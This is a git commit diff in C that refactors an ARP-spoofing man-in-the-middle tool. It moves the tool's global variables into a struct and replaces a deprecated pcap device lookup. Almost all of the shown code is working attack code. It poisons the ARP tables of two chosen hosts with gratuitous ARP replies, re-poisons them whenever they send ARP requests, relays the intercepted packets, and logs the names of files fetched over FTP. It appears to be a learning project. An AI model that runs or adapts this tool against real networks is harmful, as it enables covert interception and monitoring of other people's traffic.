7cfe7965698ed44bc52874b3a1bbb620c9acac3c
Jose <direccionjaa@gmail.com>
2022-08-12 17:51:02 +0200

    Remove global variables and deprecated functions

--- src/main.c
+++ src/main.c
@@ -6,14 +6,58 @@
 #include <arpa/inet.h> // ntohs
 #include <net/ethernet.h>
 
-u_int32_t	ip_src;
-u_int8_t	*mac_src;
-u_int32_t	ip_target;
-u_int8_t	*mac_target;
-u_int8_t	*mac_attacker;
-libnet_t	*l;
+typedef struct s_vars
+{
+	u_int32_t	ip_src;
+	u_int8_t	*mac_src;
+	u_int32_t	ip_target;
+	u_int8_t	*mac_target;
+	u_int8_t	*mac_attacker;
+	libnet_t	*l;
+	pcap_t		*handle;
+} t_vars;
 
-void	get_args(int ac, char **av, libnet_t *l)
+void		get_args(int ac, char **av, t_vars *vars);
+u_int8_t	*get_own_mac(libnet_t *l);
+void		send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
+			u_int8_t *target_mac, u_int32_t target_ip, libnet_t *l);
+void 		packet_handler(u_char *args, 
+			const struct pcap_pkthdr *packet_header, const u_char *packet_body);
+pcap_t 		*open_device(char *filter_exp);
+
+int main(int ac, char **av)
+{
+	t_vars	vars;
+	char	errbuf[LIBNET_ERRBUF_SIZE];
+
+	vars.l = libnet_init(LIBNET_LINK, NULL, errbuf);
+	if (!vars.l) {
+		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
+		exit(EXIT_FAILURE);
+	}
+
+	// Get ip and mac addresses
+	get_args(ac, av, &vars);
+	vars.mac_attacker = get_own_mac(vars.l);
+
+	// Infect arp tables
+	send_gratuitous_arp(vars.mac_attacker, vars.ip_src,
+			vars.mac_target, vars.ip_target, vars.l);
+	send_gratuitous_arp(vars.mac_attacker, vars.ip_target,
+			vars.mac_src, vars.ip_src, vars.l);
+
+	printf("Listening...\n");
+
+	vars.handle = open_device(NULL);
+	pcap_loop(vars.handle, 0, packet_handler, (u_char *)&vars);
+
+	pcap_close(vars.handle);
+	free(vars.mac_src);
+	free(vars.mac_target);
+	libnet_destroy(vars.l);
+}
+
+void	get_args(int ac, char **av, t_vars *vars)
 {
 	int	len;
 
@@ -24,29 +68,29 @@ void	get_args(int ac, char **av, libnet_t *l)
 		exit(0);
 	}
 
-	ip_src = libnet_name2addr4(l, av[1], LIBNET_DONT_RESOLVE);
-	if (ip_src == -1) {
+	vars->ip_src = libnet_name2addr4(vars->l, av[1], LIBNET_DONT_RESOLVE);
+	if (vars->ip_src == -1) {
 		fprintf(stderr, "Error converting IP source address.\n");
-		libnet_destroy(l);
+		libnet_destroy(vars->l);
 		exit(EXIT_FAILURE);
 	}
-	mac_src = libnet_hex_aton(av[2], &len);
-	if (!mac_src) {
+	vars->mac_src = libnet_hex_aton(av[2], &len);
+	if (!vars->mac_src) {
 		fprintf(stderr, "Error converting MAC source address.\n");
-		libnet_destroy(l);
+		libnet_destroy(vars->l);
 		exit(EXIT_FAILURE);
 	}
-	ip_target = libnet_name2addr4(l, av[3], LIBNET_DONT_RESOLVE);
-	if (ip_target == -1) {
+	vars->ip_target = libnet_name2addr4(vars->l, av[3], LIBNET_DONT_RESOLVE);
+	if (vars->ip_target == -1) {
 		fprintf(stderr, "Error converting IP target address.\n");
-		libnet_destroy(l);
+		libnet_destroy(vars->l);
 		exit(EXIT_FAILURE);
 	}
-	mac_target = libnet_hex_aton(av[4], &len);
-	if (!mac_target) {
+	vars->mac_target = libnet_hex_aton(av[4], &len);
+	if (!vars->mac_target) {
 		fprintf(stderr, "Error converting MAC target address.\n");
-		libnet_destroy(l);
-		free(mac_src);
+		libnet_destroy(vars->l);
+		free(vars->mac_src);
 		exit(EXIT_FAILURE);
 	}
 }
@@ -98,6 +142,7 @@ void	send_gratuitous_arp(u_int8_t *sender_mac, u_int32_t sender_ip,
 void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
 		const u_char *packet_body)
 {
+	t_vars *vars = (t_vars *)args;
 	struct ether_header *eth_header;
 	eth_header = (struct ether_header *)packet_body;
 
@@ -107,31 +152,36 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *packet_header,
 		if (opcode == 1) // If ARP request
 		{
 			u_int32_t target_ip = *(u_int32_t *)(packet_body + 14 + 24);
-			if (target_ip == ip_target)
-				send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);
-			if (target_ip == ip_src)
-				send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
+			if (target_ip == vars->ip_target)
+				send_gratuitous_arp(vars->mac_attacker, vars->ip_target,
+						vars->mac_src, vars->ip_src, vars->l);
+			if (target_ip == vars->ip_src)
+				send_gratuitous_arp(vars->mac_attacker, vars->ip_src,
+						vars->mac_target, vars->ip_target, vars->l);
 		}
 	}
 	else
 	{
 		if (ntohs(eth_header->ether_type) == ETHERTYPE_IP
-			&& !memcmp("RETR", packet_body + 14 + 20 + 32, 4)) // ether + ip + tcp
+			&& !memcmp("RETR", packet_body + 14 + 20 + 32, 4) // ether + ip + tcp
+			&& memcmp(vars->mac_attacker, eth_header->ether_shost, 6)) // attacker mac != source mac
 			printf("Transfering: %s\n", (char *)packet_body+14+20+32+5);
-		pcap_t *handle = (pcap_t *)args;
-		pcap_inject(handle, packet_body, packet_header->caplen);
+		pcap_inject(vars->handle, packet_body, packet_header->caplen);
 	}
 }
 
 pcap_t *open_device(char *filter_exp)
 {
-	char	*device;
+	char	*device = NULL;
 	char	error_buffer[PCAP_ERRBUF_SIZE];
 	pcap_t	*handle;
 
 	// Get name device
-	device = pcap_lookupdev(error_buffer);
-	if (!device)
+	pcap_if_t	*alldevsp;
+	int res = pcap_findalldevs(&alldevsp, error_buffer);
+	if (alldevsp != NULL)
+		device = alldevsp->name;
+	if (res || !device)
 	{
 		fprintf(stderr, "Error finding device: %s\n", error_buffer);
 		exit(EXIT_FAILURE);
@@ -159,33 +209,4 @@ pcap_t *open_device(char *filter_exp)
 		}
 	}
 	return (handle);
-}
-
-int main(int ac, char **av)
-{
-	char		errbuf[LIBNET_ERRBUF_SIZE];
-
-	l = libnet_init(LIBNET_LINK, NULL, errbuf);
-	if (!l) {
-		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
-		exit(EXIT_FAILURE);
-	}
-
-	// Get ip and mac addresses
-	get_args(ac, av, l);
-	mac_attacker = get_own_mac(l);
-
-	send_gratuitous_arp(mac_attacker, ip_src, mac_target, ip_target, l);
-	send_gratuitous_arp(mac_attacker, ip_target, mac_src, ip_src, l);
-
-	printf("Listening...\n");
-
-	/*pcap_t *handle = open_device("arp and arp[6:2] == 1"); // Arp request*/
-	pcap_t *handle = open_device(NULL);
-	pcap_loop(handle, 0, packet_handler, (u_char *)handle);
-
-	pcap_close(handle);
-	free(mac_src);
-	free(mac_target);
-	libnet_destroy(l);
 }
